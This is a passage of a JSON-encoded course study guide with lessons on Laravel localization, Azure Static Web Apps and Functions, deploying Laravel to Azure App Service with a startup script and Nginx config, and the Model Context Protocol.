(fr)\n    └── de.json              ← JSON translation file (de)"},{"kind":"p","html":"Past-exam Q1 tested this path exactly. The distractors were \u003ccode\u003eresources/views/lang\u003c/code\u003e, \u003ccode\u003estorage/lang\u003c/code\u003e, \u003ccode\u003ebootstrap/lang\u003c/code\u003e, and \u003ccode\u003eapp/lang\u003c/code\u003e. The correct answer is \u003ccode\u003eresources/lang/\u003c/code\u003e.","text":"Past-exam Q1 tested this path exactly. The distractors were `resources/views/lang`, `storage/lang`, `bootstrap/lang`, and `app/lang`. The correct answer is `resources/lang/`."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e Translation files placed in \u003ccode\u003eresources/views/lang/\u003c/code\u003e, \u003ccode\u003estorage/lang/\u003c/code\u003e, or \u003ccode\u003eapp/lang/\u003c/code\u003e are silently ignored. The only valid base path is \u003ccode\u003eresources/lang/\u003c/code\u003e. This was tested directly on the past exam (Q1) with all three wrong paths as distractors.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e Laravel&#39;s localization system requires two things to work: translation files in the right place (\u003ccode\u003eresources/lang/{locale}/\u003c/code\u003e for PHP, \u003ccode\u003eresources/lang/{locale}.json\u003c/code\u003e for JSON) and the \u003ccode\u003e__()\u003c/code\u003e helper in your templates. \u003ccode\u003eApp::setLocale()\u003c/code\u003e switches the locale at runtime; middleware is the correct place to call it so every request gets the right language. \u003ccode\u003etrans_choice()\u003c/code\u003e is the pluralization helper — use it when counts change the phrasing.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":14,"id":"azure-static-web-apps","title":"Azure Static Web Apps and Azure Functions","hook":"One service hosts your React front end and your TypeScript API backend — no server provisioning required.","tags":["azure","serverless","typescript","static-web-apps","deployment"],"module":"Cloud Deployment","source":"ts-function-apps.pptx; static-web-apps-SCRIPT.docx","blocks":[{"kind":"h2","html":"A function that runs without a server","text":"A function that runs without a server"},{"kind":"p","html":"You push code to GitHub. Azure boots your function in response to an HTTP request, runs it, and shuts down. You pay for execution time, not idle capacity. That is the serverless contract.","text":"You push code to GitHub. Azure boots your function in response to an HTTP request, runs it, and shuts down. You pay for execution time, not idle capacity. That is the serverless contract."},{"kind":"p","html":"Here is the minimal HTTP-triggered function from the slides:","text":"Here is the minimal HTTP-triggered function from the slides:"},{"kind":"code","lang":"ts","code":"import { AzureFunction, Context, HttpRequest } from \"@azure/functions\";\n\nconst httpTrigger: AzureFunction = async (context: Context, req: HttpRequest) =\u003e {\n  const name = req.query.name || req.body?.name || \"world\";\n  context.res = { body: `Hello, ${name}!` };\n};\n\nexport default httpTrigger;"},{"kind":"p","html":"The function reads \u003ccode\u003ename\u003c/code\u003e from the query string. If nothing is provided, it falls back to \u003ccode\u003e&quot;world&quot;\u003c/code\u003e. The response goes out through \u003ccode\u003econtext.res\u003c/code\u003e.","text":"The function reads `name` from the query string. If nothing is provided, it falls back to `\"world\"`. The response goes out through `context.res`."},{"kind":"checkpoint","q":"What type does `req` have in the example above?","a":"`HttpRequest` — imported from `@azure/functions`. This gives you type-safe access to `.query`, `.body`, `.headers`, and `.method`."},{"kind":"h2","html":"Triggers and bindings","text":"Triggers and bindings"},{"kind":"p","html":"Every Azure Function starts because something happened. That something is the \u003cstrong\u003etrigger (Azure)\u003c/strong\u003e. The trigger is not optional — every function has exactly one.","text":"Every Azure Function starts because something happened. That something is the **trigger (Azure)**. The trigger is not optional — every function has exactly one."},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eTrigger\u003c/th\u003e\n\u003cth\u003eWhat fires it\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eHTTP\u003c/td\u003e\n\u003ctd\u003eAn inbound HTTP request (REST calls, webhooks)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eTimer\u003c/td\u003e\n\u003ctd\u003eA cron schedule (e.g., \u003ccode\u003e0 */5 * * * *\u003c/code\u003e = every 5 min)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eQueue\u003c/td\u003e\n\u003ctd\u003eA message arriving in Azure Storage Queue\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eBlob\u003c/td\u003e\n\u003ctd\u003eA file created or updated in Azure Blob Storage\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eEvent Hub\u003c/td\u003e\n\u003ctd\u003eA stream event from Azure Event Hub\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"The order above matches the canonical ordering in Azure Functions documentation: HTTP, Timer, Queue, Blob, Event Hub.","text":"The order above matches the canonical ordering in Azure Functions documentation: HTTP, Timer, Queue, Blob, Event Hub."},{"kind":"p","html":"\u003cstrong\u003eBindings\u003c/strong\u003e are different. A \u003cstrong\u003ebinding (Azure)\u003c/strong\u003e connects your function to an input or output without any SDK code in your function body. You declare the connection in \u003cstrong\u003efunction.json\u003c/strong\u003e; Azure injects the data or writes the result.","text":"**Bindings** are different. A **binding (Azure)** connects your function to an input or output without any SDK code in your function body. You declare the connection in **function.json**; Azure injects the data or writes the result."},{"kind":"code","lang":"json","code":"{\n  \"bindings\": [\n    { \"type\": \"httpTrigger\", \"direction\": \"in\", \"name\": \"req\", \"methods\": [\"get\", \"post\"] },\n    { \"type\": \"http\",        \"direction\": \"out\", \"name\": \"res\" }\n  ]\n}"},{"kind":"p","html":"The trigger (httpTrigger) is also declared in \u003ccode\u003efunction.json\u003c/code\u003e. The second binding says: write \u003ccode\u003econtext.res\u003c/code\u003e back as the HTTP response.","text":"The trigger (httpTrigger) is also declared in `function.json`. The second binding says: write `context.res` back as the HTTP response."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e Confusing triggers and bindings is the most common exam error. A trigger \u003cem\u003estarts\u003c/em\u003e the function — there is exactly one. Bindings are \u003cem\u003eoptional\u003c/em\u003e input/output connections — there can be zero or many.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"checkpoint","q":"If you want to write to an Azure Storage Queue after processing an HTTP request, do you add another trigger or another binding?","a":"Another binding — specifically an output binding. The function still starts from a single HTTP trigger. Bindings handle the queue write declaratively."},{"kind":"h2","html":"Azure Static Web Apps: front end + backend in one service","text":"Azure Static Web Apps: front end + backend in one service"},{"kind":"p","html":"Azure Static Web Apps hosts a single-page application (SPA) and its Azure Functions backend under a single URL. The supported front-end frameworks include Vue, Svelte, React, and Angular.","text":"Azure Static Web Apps hosts a single-page application (SPA) and its Azure Functions backend under a single URL. The supported front-end frameworks include Vue, Svelte, React, and Angular."},{"kind":"mermaid","source":"graph LR\n  A[GitHub Repo] --\u003e|GitHub Actions| B[Azure Static Web Apps]\n  B --\u003e C[Static Files - React SPA]\n  B --\u003e D[Azure Functions - /api/*]\n  D --\u003e E[Database / Storage]"},{"kind":"p","html":"When a request hits \u003ccode\u003e/api/something\u003c/code\u003e, Azure routes it to the matching Azure Function in your \u003ccode\u003ebackend/\u003c/code\u003e folder. All other paths serve the static SPA files. The two live in the same GitHub repository:","text":"When a request hits `/api/something`, Azure routes it to the matching Azure Function in your `backend/` folder. All other paths serve the static SPA files. The two live in the same GitHub repository:"},{"kind":"code","lang":"text","code":"ts-static-web-app/\n├── backend/    ← Azure Functions (TypeScript)\n└── frontend/   ← React SPA (Vite)"},{"kind":"p","html":"Deployment is automatic. When you link the GitHub repo in the Azure portal, Azure generates a GitHub Actions \u003ccode\u003e.yml\u003c/code\u003e file. Every push to \u003ccode\u003emain\u003c/code\u003e triggers a build-and-deploy workflow.","text":"Deployment is automatic. When you link the GitHub repo in the Azure portal, Azure generates a GitHub Actions `.yml` file. Every push to `main` triggers a build-and-deploy workflow."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e The auto-generated \u003ccode\u003e.yml\u003c/code\u003e file lands in \u003ccode\u003e.github/workflows/\u003c/code\u003e only after you do a \u003ccode\u003egit pull\u003c/code\u003e. If the build fails, pull first, then edit \u003ccode\u003eoutput_location\u003c/code\u003e and \u003ccode\u003eapp_build_command\u003c/code\u003e in the \u003ccode\u003e.yml\u003c/code\u003e, then push again.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"h2","html":"Environment variables","text":"Environment variables"},{"kind":"p","html":"Secrets (database connection strings, API keys) live in Azure portal under \u003cstrong\u003eSettings &gt;&gt; Environment variables\u003c/strong\u003e — never in committed code. In local development, they go in \u003ccode\u003elocal.settings.json\u003c/code\u003e, which is git-ignored by default.","text":"Secrets (database connection strings, API keys) live in Azure portal under **Settings \u003e\u003e Environment variables** — never in committed code. In local development, they go in `local.settings.json`, which is git-ignored by default."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e The GitHub Actions \u003ccode\u003e.yml\u003c/code\u003e file is auto-generated by Azure when you link the repo. Always pull it into your local repo before making edits — pushing without pulling first overwrites the auto-generated workflow and breaks the build.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e Azure Static Web Apps packages your TypeScript functions and your React SPA in a single deployable unit. The trigger defines what wakes the function up; the binding wires it to data sources without SDK boilerplate. Getting this trigger-vs-binding distinction right is the key exam checkpoint for this topic.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":15,"id":"azure-laravel-deployment","title":"Deploying Laravel to Azure App Service","hook":"Your local Laravel app works perfectly. Getting it running on Azure requires one extra file and a handful of portal steps — here is exactly how.","tags":["azure","deployment","laravel","nginx"],"module":"cloud-deployment","source":"resources/Steps to Azure Deployment.html; resources/Fixes 2026.html","blocks":[{"kind":"h2","html":"The problem: why local ≠ cloud","text":"The problem: why local ≠ cloud"},{"kind":"p","html":"Your local machine has a \u003ccode\u003e.env\u003c/code\u003e file, a running PHP server, and pre-built storage directories. Azure App Service has none of those by default. The container that Azure spins up runs Nginx, not PHP&#39;s built-in server. It has no \u003ccode\u003e.env\u003c/code\u003e file on disk, no SQLite file, and no \u003ccode\u003estorage/framework/\u003c/code\u003e hierarchy.","text":"Your local machine has a `.env` file, a running PHP server, and pre-built storage directories. Azure App Service has none of those by default. The container that Azure spins up runs Nginx, not PHP's built-in server. It has no `.env` file on disk, no SQLite file, and no `storage/framework/` hierarchy."},{"kind":"p","html":"Push raw Laravel code to Azure and you get a blank page or a 500 error. The fix is two things: a shell script that runs at container startup, and environment variables set in the Azure portal.","text":"Push raw Laravel code to Azure and you get a blank page or a 500 error. The fix is two things: a shell script that runs at container startup, and environment variables set in the Azure portal."},{"kind":"checkpoint","q":"Before reading on — what would happen if Azure tried to serve a Laravel app without running `php artisan config:cache` first?","a":"Laravel reads config from `config/*.php`, which itself reads from `.env`. With no `.env` on Azure, config values are missing or null, and the app crashes. Caching bakes the current environment values into a PHP file so Laravel never touches `.env` again."},{"kind":"h2","html":"Step 1 — Add \u003ccode\u003estartup.sh\u003c/code\u003e and \u003ccode\u003edefault\u003c/code\u003e to your repo root","text":"Step 1 — Add `startup.sh` and `default` to your repo root"},{"kind":"p","html":"Two files go in the \u003cstrong\u003eroot of your Laravel project\u003c/strong\u003e (alongside \u003ccode\u003eartisan\u003c/code\u003e, \u003ccode\u003ecomposer.json\u003c/code\u003e, etc.):","text":"Two files go in the **root of your Laravel project** (alongside `artisan`, `composer.json`, etc.):"},{"kind":"p","html":"\u003cstrong\u003e\u003ccode\u003estartup.sh\u003c/code\u003e\u003c/strong\u003e — the shell script Azure runs at container startup:","text":"**`startup.sh`** — the shell script Azure runs at container startup:"},{"kind":"code","lang":"bash","code":"#!/bin/bash\n\n# Stop Nginx before reconfiguring\nservice nginx stop\n\n# Create the SQLite file if it does not exist yet\nif [ ! -f /home/site/wwwroot/database/database.sqlite ]; then\n    touch /home/site/wwwroot/database/database.sqlite\n    chmod 666 /home/site/wwwroot/database/database.sqlite\nfi\n\n# Ensure Laravel's storage directory tree exists\nmkdir -p /home/site/wwwroot/storage/framework/views\nmkdir -p /home/site/wwwroot/storage/framework/cache\nmkdir -p /home/site/wwwroot/storage/framework/sessions\nmkdir -p /home/site/wwwroot/storage/logs\n\n# Set permissions for the web server user\nchmod -R 775 /home/site/wwwroot/storage\nchmod -R 775 /home/site/wwwroot/bootstrap/cache\nchown -R www-data:www-data /home/site/wwwroot/storage\nchown -R www-data:www-data /home/site/wwwroot/bootstrap/cache\n\n# Run migrations and seeders\nphp /home/site/wwwroot/artisan migrate --force\nphp /home/site/wwwroot/artisan db:seed --force\n\n# Clear stale caches, then rebuild them\nphp /home/site/wwwroot/artisan cache:clear\nphp /home/site/wwwroot/artisan config:clear\nphp /home/site/wwwroot/artisan config:cache\nphp /home/site/wwwroot/artisan route:clear\nphp /home/site/wwwroot/artisan view:clear\nphp /home/site/wwwroot/artisan view:cache\n\n# Install the custom Nginx config and start Nginx\ncp /home/site/wwwroot/default /etc/nginx/sites-available/default\nln -sf /etc/nginx/sites-available/default /etc/nginx/sites-enabled/default\nservice nginx start"},{"kind":"p","html":"\u003cstrong\u003e\u003ccode\u003edefault\u003c/code\u003e\u003c/strong\u003e — Nginx virtual-host config (listens on port 8080, routes PHP through FastCGI):","text":"**`default`** — Nginx virtual-host config (listens on port 8080, routes PHP through FastCGI):"},{"kind":"code","lang":"text","code":"server {\n    listen 8080;\n    listen [::]:8080;\n\n    root /home/site/wwwroot/public;\n    index index.php index.html index.htm;\n\n    location / {\n        try_files $uri $uri/ /index.php?$args;\n    }\n\n    location ~ \\.php$ {\n        try_files $uri =404;\n        fastcgi_split_path_info ^(.+\\.php)(/.+)$;\n        fastcgi_pass 127.0.0.1:9000;\n        fastcgi_index index.php;\n        include fastcgi_params;\n        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n        fastcgi_param PATH_INFO $fastcgi_path_info;\n    }\n}"},{"kind":"p","html":"Commit both files and push to GitHub.","text":"Commit both files and push to GitHub."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e Do not put \u003ccode\u003estartup.sh\u003c/code\u003e inside \u003ccode\u003epublic/\u003c/code\u003e or \u003ccode\u003estorage/\u003c/code\u003e. Azure will not find it there. It must sit alongside \u003ccode\u003eartisan\u003c/code\u003e in the project root. Azure later references it as \u003ccode\u003e/home/site/wwwroot/startup.sh\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"h2","html":"Step 2 — Create the Azure App Service","text":"Step 2 — Create the Azure App Service"},{"kind":"p","html":"In the Azure portal:","text":"In the Azure portal:"},{"kind":"p","html":"\u003col\u003e\n\u003cli\u003eCreate a new \u003cstrong\u003eApp Service → Web App\u003c/strong\u003e.\u003c/li\u003e\n\u003cli\u003eSet \u003cstrong\u003eRuntime stack\u003c/strong\u003e to \u003cstrong\u003ePHP\u003c/strong\u003e (the version your app targets).\u003c/li\u003e\n\u003cli\u003eSet \u003cstrong\u003eOperating System\u003c/strong\u003e to \u003cstrong\u003eLinux\u003c/strong\u003e — the startup script is a bash script; it does not run on Windows.\u003c/li\u003e\n\u003cli\u003eFinish creating the resource.\u003c/li\u003e\n\u003c/ol\u003e","text":"1. Create a new **App Service → Web App**.\n2. Set **Runtime stack** to **PHP** (the version your app targets).\n3. Set **Operating System** to **Linux** — the startup script is a bash script; it does not run on Windows.\n4. Finish creating the resource."},{"kind":"h2","html":"Step 3 — Set environment variables in Azure Configuration","text":"Step 3 — Set environment variables in Azure Configuration"},{"kind":"p","html":"Azure replaces \u003ccode\u003e.env\u003c/code\u003e. You set key-value pairs in \u003cstrong\u003eSettings → Configuration → Application settings\u003c/strong\u003e. Laravel reads them at runtime exactly as it would read \u003ccode\u003e.env\u003c/code\u003e.","text":"Azure replaces `.env`. You set key-value pairs in **Settings → Configuration → Application settings**. Laravel reads them at runtime exactly as it would read `.env`."},{"kind":"p","html":"The minimum set for an SQLite API app:","text":"The minimum set for an SQLite API app:"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eKey\u003c/th\u003e\n\u003cth\u003eValue\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eAPP_DEBUG\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003etrue\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eAPP_STORAGE\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e/home/site/wwwroot/storage\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eAPP_KEY\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003ebase64:…\u003c/code\u003e (your generated key)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eDB_CONNECTION\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003esqlite\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eDB_DATABASE\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e/home/site/wwwroot/database/database.sqlite\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e Never upload a \u003ccode\u003e.env\u003c/code\u003e file to Azure or commit it to GitHub. Environment variables belong in \u003cstrong\u003eConfiguration → Application settings\u003c/strong\u003e only. Committing \u003ccode\u003e.env\u003c/code\u003e exposes your \u003ccode\u003eAPP_KEY\u003c/code\u003e and database credentials to anyone who can read the repo.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"h2","html":"Step 4 — Wire the startup command","text":"Step 4 — Wire the startup command"},{"kind":"p","html":"Still in the Azure portal, go to \u003cstrong\u003eSettings → Configuration → Stack settings\u003c/strong\u003e. In the \u003cstrong\u003eStartup Command\u003c/strong\u003e field enter:","text":"Still in the Azure portal, go to **Settings → Configuration → Stack settings**. In the **Startup Command** field enter:"},{"kind":"code","lang":"bash","code":"bash /home/site/wwwroot/startup.sh"},{"kind":"p","html":"This tells the App Service container to run your script every time the container boots.","text":"This tells the App Service container to run your script every time the container boots."},{"kind":"h2","html":"Step 5 — Link to GitHub and deploy","text":"Step 5 — Link to GitHub and deploy"},{"kind":"p","html":"\u003col\u003e\n\u003cli\u003eGo to \u003cstrong\u003eDeployment Center\u003c/strong\u003e on your App Service.\u003c/li\u003e\n\u003cli\u003eChoose \u003cstrong\u003eGitHub\u003c/strong\u003e as the source.\u003c/li\u003e\n\u003cli\u003eAuthorize and select your repo and branch.\u003c/li\u003e\n\u003cli\u003eAzure creates a GitHub Actions workflow file (\u003ccode\u003e.github/workflows/main_*.yml\u003c/code\u003e). Pull it locally with \u003ccode\u003egit pull\u003c/code\u003e so your repo stays in sync.\u003c/li\u003e\n\u003cli\u003eEvery future push to the linked branch automatically triggers a new deployment.\u003c/li\u003e\n\u003c/ol\u003e","text":"1. Go to **Deployment Center** on your App Service.\n2. Choose **GitHub** as the source.\n3. Authorize and select your repo and branch.\n4. Azure creates a GitHub Actions workflow file (`.github/workflows/main_*.yml`). Pull it locally with `git pull` so your repo stays in sync.\n5. Every future push to the linked branch automatically triggers a new deployment."},{"kind":"checkpoint","q":"Why does `migrate --force` appear in `startup.sh` instead of running once during CI?","a":"Azure's Linux container can be recycled at any time. The `--force` flag bypasses the \"are you sure?\" prompt that migration shows in non-local environments. Running migrate at startup guarantees the schema is always current even after a container restart."},{"kind":"h2","html":"Optional — Swagger UI on Azure","text":"Optional — Swagger UI on Azure"},{"kind":"p","html":"If your app uses Swagger, add these two lines to the &quot;Clear and cache&quot; block in \u003ccode\u003estartup.sh\u003c/code\u003e:","text":"If your app uses Swagger, add these two lines to the \"Clear and cache\" block in `startup.sh`:"},{"kind":"code","lang":"bash","code":"php /home/site/wwwroot/artisan l5-swagger:publish\nphp /home/site/wwwroot/artisan l5-swagger:generate"},{"kind":"p","html":"Also add both the local and the Azure URL as \u003ccode\u003eOA\\Server\u003c/code\u003e entries in \u003ccode\u003eController.php\u003c/code\u003e, and force HTTPS in \u003ccode\u003eAppServiceProvider::boot()\u003c/code\u003e:","text":"Also add both the local and the Azure URL as `OA\\Server` entries in `Controller.php`, and force HTTPS in `AppServiceProvider::boot()`:"},{"kind":"code","lang":"php","code":"if (config('app.env') === 'production') {\n    URL::forceScheme('https');\n}"},{"kind":"h2","html":"Mono-repo: backend + frontend in one GitHub repo","text":"Mono-repo: backend + frontend in one GitHub repo"},{"kind":"p","html":"Azure supports deploying a Laravel backend and a static frontend from the same repo. Use two separate Azure deployments:","text":"Azure supports deploying a Laravel backend and a static frontend from the same repo. Use two separate Azure deployments:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eApp Service → Web App\u003c/strong\u003e for the Laravel backend (uses the same \u003ccode\u003estartup.sh\u003c/code\u003e flow above).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eStatic Web Apps\u003c/strong\u003e for the React/HTML frontend.\u003c/li\u003e\n\u003c/ul\u003e","text":"- **App Service → Web App** for the Laravel backend (uses the same `startup.sh` flow above).\n- **Static Web Apps** for the React/HTML frontend."},{"kind":"p","html":"Each deployment has its own GitHub Actions workflow file. Edit the backend workflow to point at the correct subfolder (e.g., \u003ccode\u003elaravel-backend/\u003c/code\u003e).","text":"Each deployment has its own GitHub Actions workflow file. Edit the backend workflow to point at the correct subfolder (e.g., `laravel-backend/`)."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e Omitting \u003ccode\u003ephp artisan config:cache\u003c/code\u003e from \u003ccode\u003estartup.sh\u003c/code\u003e is the most common cause of 500 errors on Azure. Without it, Laravel attempts to read \u003ccode\u003e.env\u003c/code\u003e, which does not exist in the container. The cache step is not optional.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e Deploying Laravel to Azure requires exactly one extra file (\u003ccode\u003estartup.sh\u003c/code\u003e) placed in the project root, a startup command set in the Azure portal, and environment variables entered in Configuration — not in a \u003ccode\u003e.env\u003c/code\u003e file. Every container restart re-runs the script, so migrations and caches are always fresh.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":16,"id":"mcp-protocol","title":"Model Context Protocol","hook":"Your Laravel app can become an AI-callable API — but only if the AI has a standard way to discover and invoke it.","tags":["mcp","model-context-protocol","ai","tools","resources","prompts","json-rpc"],"module":"MCP","source":"laravel_mcp.pptx slides 1–10","blocks":[{"kind":"h2","html":"A scenario before the protocol","text":"A scenario before the protocol"},{"kind":"p","html":"Imagine you have a Laravel API that manages a to-do list. An AI assistant — say, Claude — needs to add an item, fetch existing tasks, and run a summary prompt. Without a standard contract, the AI cannot discover what endpoints exist, what parameters they expect, or what format they return.","text":"Imagine you have a Laravel API that manages a to-do list. An AI assistant — say, Claude — needs to add an item, fetch existing tasks, and run a summary prompt. Without a standard contract, the AI cannot discover what endpoints exist, what parameters they expect, or what format they return."},{"kind":"checkpoint","q":"Before reading further: what would you need to define so any AI can call your Laravel API without custom wiring per model?","a":"A standard that describes callable actions, available data sources, and reusable prompt templates — with a common transport and message format both sides understand. That standard is Model Context Protocol."},{"kind":"p","html":"That interoperability problem is exactly what \u003cstrong\u003eModel Context Protocol\u003c/strong\u003e solves.","text":"That interoperability problem is exactly what **Model Context Protocol** solves."},{"kind":"h2","html":"What is Model Context Protocol?","text":"What is Model Context Protocol?"},{"kind":"p","html":"\u003cstrong\u003eModel Context Protocol\u003c/strong\u003e is Anthropic&#39;s open standard for connecting AI models to external tools, resources, and data sources. It defines a universal client-server contract so any compliant AI application can talk to any compliant server — without custom integration code per model or per service.","text":"**Model Context Protocol** is Anthropic's open standard for connecting AI models to external tools, resources, and data sources. It defines a universal client-server contract so any compliant AI application can talk to any compliant server — without custom integration code per model or per service."},{"kind":"p","html":"The protocol runs over \u003cstrong\u003eJSON-RPC 2.0\u003c/strong\u003e: every message is a JSON object with a \u003ccode\u003ejsonrpc\u003c/code\u003e version field, a \u003ccode\u003emethod\u003c/code\u003e name, an \u003ccode\u003eid\u003c/code\u003e, and either \u003ccode\u003eparams\u003c/code\u003e (request) or \u003ccode\u003eresult\u003c/code\u003e/\u003ccode\u003eerror\u003c/code\u003e (response).","text":"The protocol runs over **JSON-RPC 2.0**: every message is a JSON object with a `jsonrpc` version field, a `method` name, an `id`, and either `params` (request) or `result`/`error` (response)."},{"kind":"p","html":"Transport options are:","text":"Transport options are:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eSTDIO\u003c/strong\u003e — standard input/output; for local (same-machine) processes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSSE (Server-Sent Events)\u003c/strong\u003e — HTTP streaming; for remote servers.\u003c/li\u003e\n\u003c/ul\u003e","text":"- **STDIO** — standard input/output; for local (same-machine) processes.\n- **SSE (Server-Sent Events)** — HTTP streaming; for remote servers."},{"kind":"h2","html":"The three primitives","text":"The three primitives"},{"kind":"p","html":"Every Model Context Protocol server exposes some combination of three primitive types.","text":"Every Model Context Protocol server exposes some combination of three primitive types."},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003ePrimitive\u003c/th\u003e\n\u003cth\u003eWhat it is\u003c/th\u003e\n\u003cth\u003eExamples\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eTools (MCP)\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eCallable actions the AI can invoke\u003c/td\u003e\n\u003ctd\u003eAPI calls, running scripts, multi-step workflows\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eResources (MCP)\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eData sources exposed to the AI\u003c/td\u003e\n\u003ctd\u003eLocal files, database queries, cloud documents\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003ePrompts (MCP)\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eReusable LLM interaction templates\u003c/td\u003e\n\u003ctd\u003eCode review prompt, bug triage template\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"Always list them in this order when writing or speaking: Tools → Resources → Prompts.","text":"Always list them in this order when writing or speaking: Tools → Resources → Prompts."},{"kind":"checkpoint","q":"A server exposes a `GET /reports/summary` endpoint that returns a pre-formatted analysis. Which MCP primitive is that — Tools, Resources, or Prompts?","a":"Resources (MCP). It is a data source the AI loads into context. Tools are for actions that *do* something (side effects); Prompts are reusable LLM templates, not data endpoints."},{"kind":"p","html":"\u003cstrong\u003ePitfall:\u003c/strong\u003e &quot;Tools&quot; in MCP does not mean UI widgets or database tables. Tools are executable actions with potential side effects — like running a script or calling an external API. Past exam Q3 used UI components and database tables as distractors for this exact term.","text":"**Pitfall:** \"Tools\" in MCP does not mean UI widgets or database tables. Tools are executable actions with potential side effects — like running a script or calling an external API. Past exam Q3 used UI components and database tables as distractors for this exact term."},{"kind":"h2","html":"The client-server architecture","text":"The client-server architecture"},{"kind":"mermaid","source":"graph LR\n  subgraph AI Side\n    A[MCP Client\\nClaude / LLM]\n  end\n  subgraph Your App\n    B[MCP Server\\nLaravel app]\n    C[Tools\\nAPI calls / scripts]\n    D[Resources\\nFiles / DB queries]\n    E[Prompts\\nReusable templates]\n    B --\u003e C\n    B --\u003e D\n    B --\u003e E\n  end\n  A -- \"JSON-RPC 2.0\\n(STDIO or SSE)\" --\u003e B"},{"kind":"p","html":"The \u003cstrong\u003eMCP client\u003c/strong\u003e (the AI, such as Claude) sends JSON-RPC requests to the \u003cstrong\u003eMCP server\u003c/strong\u003e (your Laravel app). The server exposes Tools, Resources, and Prompts. The client discovers what is available via a \u003ccode\u003etools/list\u003c/code\u003e request, then invokes individual actions.","text":"The **MCP client** (the AI, such as Claude) sends JSON-RPC requests to the **MCP server** (your Laravel app). The server exposes Tools, Resources, and Prompts. The client discovers what is available via a `tools/list` request, then invokes individual actions."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eExample:\u003c/strong\u003e JSON-RPC tool invocation\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStep 1 — Discover available tools.\u003c/strong\u003e Client sends \u003ccode\u003e{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;tools/list&quot;,&quot;id&quot;:1}\u003c/code\u003e. Server replies with an array listing each tool&#39;s name, description, and 